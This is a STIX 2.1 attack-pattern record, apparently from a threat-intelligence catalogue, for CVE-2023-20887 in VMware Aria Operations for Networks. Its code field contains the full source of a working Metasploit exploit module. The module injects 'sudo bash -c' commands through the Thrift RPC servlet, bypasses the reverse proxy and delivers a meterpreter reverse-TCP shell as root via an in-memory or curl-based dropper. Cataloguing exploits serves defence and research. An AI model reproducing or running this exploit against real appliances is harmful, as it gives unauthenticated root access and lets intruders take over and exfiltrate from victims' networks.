{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db82fc77-8eb3-434e-95ed-01ecf18e4d8a",
    "created": "2024-08-14T17:02:15.543207Z",
    "modified": "2024-08-14T17:02:15.543211Z",
    "name": "VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE",
    "description": " VMWare Aria Operations for Networks (vRealize Network Insight) is vulnerable to command injection when accepting user input through the Apache Thrift RPC interface. This vulnerability allows a remote unauthenticated attacker to execute arbitrary commands on the underlying operating system as the root user. The RPC interface is protected by a reverse proxy which can be bypassed. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8. A malicious actor can get remote code execution in the context of 'root' on the appliance. VMWare 6.x version are vulnerable.  This module exploits the vulnerability to upload and execute payloads gaining root privileges. Successfully tested against version 6.8.0.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_vrni_rce_cve_2023_20887.rb",
            "external_id": "vmware_vrni_rce_cve_2023_20887.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-20887"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2023-0012.html"
        },
        {
            "source_name": "reference",
            "url": "https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sinsinology/CVE-2023-20887"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE',\n        'Description' => %q{\n          VMWare Aria Operations for Networks (vRealize Network Insight) is vulnerable to command injection\n          when accepting user input through the Apache Thrift RPC interface. This vulnerability allows a\n          remote unauthenticated attacker to execute arbitrary commands on the underlying operating system\n          as the root user. The RPC interface is protected by a reverse proxy which can be bypassed.\n          VMware has evaluated the severity of this issue to be in the Critical severity range with a\n          maximum CVSSv3 base score of 9.8. A malicious actor can get remote code execution in the\n          context of 'root' on the appliance.\n          VMWare 6.x version are vulnerable.\n\n          This module exploits the vulnerability to upload and execute payloads gaining root privileges.\n          Successfully tested against version 6.8.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Sina Kheirkhah', # Metasploit Module, PoC. (@SinSinology) of Summoning Team (@SummoningTeam) on twitter\n          'Anonymous with Trend Micro Zero Day Initiative',\n          'h00die' # msf module updates, corrections, qol\n        ],\n        'References' => [\n          ['CVE', '2023-20887'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2023-0012.html'],\n          ['URL', 'https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/'],\n          ['URL', 'https://github.com/sinsinology/CVE-2023-20887']\n        ],\n        'DisclosureDate' => '2023-06-07',\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => %w[unix linux],\n              'Arch' => ARCH_CMD,\n              'Type' => :in_memory,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Payload' => {\n          'BadChars' => \"\\x27\"\n        },\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  def check_vrni\n    res = nil\n    (2..10).step do |x|\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, \"/api/vip/i18n/api/v2/translation/products/vRNIUI/versions/6.#{x}.0/locales/en-GB/components/UI\"),\n        'vars_get' => {\n          'pseudo' => 'false'\n        }\n      })\n      next if res && res.code == 200 && res.body.include?('Failed to get locale list for vRNIUI')\n\n      break\n    end\n    res\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status('Attempting to execute shell')\n    shell = \"[1,\\\"createSupportBundle\\\",1,0,{\\\"1\\\":{\\\"str\\\":\\\"#{rand(1000..9999)}\\\"},\\\"2\\\":{\\\"str\\\":\\\"`sudo bash -c '#{cmd}'`\\\"},\\\"3\\\":{\\\"str\\\":\\\"#{Rex::Text.rand_text_alpha(4)}\\\"},\\\"4\\\":{\\\"lst\\\":[\\\"str\\\",2,\\\"#{Rex::Text.rand_text_alpha(4)}\\\",\\\"#{Rex::Text.rand_text_alpha(4)}\\\"]}}]\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/saas./resttosaasservlet'),\n      'ctype' => 'application/x-thrift',\n      'headers' => {\n        'Accept' => 'application/json, text/plain, */*'\n      },\n      'encode_params' => false,\n      'data' => shell\n    })\n    fail_with(Failure::Unknown, 'Communication error occurred') if res.nil?\n  end\n\n  # Checking if the target is potential vulnerable checking the json response to contain the vRNIUI string\n  # that indicates the target is running VMWare Aria Operations for Networks (vRealize Network Insight)\n  def check\n    print_status(\"Checking if #{peer} can be exploited.\")\n    res = check_vrni\n    return CheckCode::Unknown('No response received from the target!') unless res\n\n    body = res.get_json_document\n    if body.nil? || body['data']['productName'] != 'vRNIUI'\n      return CheckCode::Safe('Target is not running VMWare Aria Operations for Networks (vRealize Network Insight).')\n    end\n\n    version = Rex::Version.new(body['data']['version'])\n    return CheckCode::Vulnerable(\"VMWare Aria Operations for Networks (vRealize Network Insight) version #{version} was found.\") if version >= Rex::Version.new('6.2') && version <= Rex::Version.new('6.10')\n\n    CheckCode::Appears(\"Target is running VMWare Aria Operations for Networks (vRealize Network Insight) version #{version}\")\n  end\n\n  def exploit\n    case target['Type']\n    when :in_memory\n      print_status(\"Executing #{target.name} with #{payload.encoded}\")\n      execute_command(payload.encoded)\n    when :linux_dropper\n      print_status(\"Executing #{target.name}\")\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-06-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}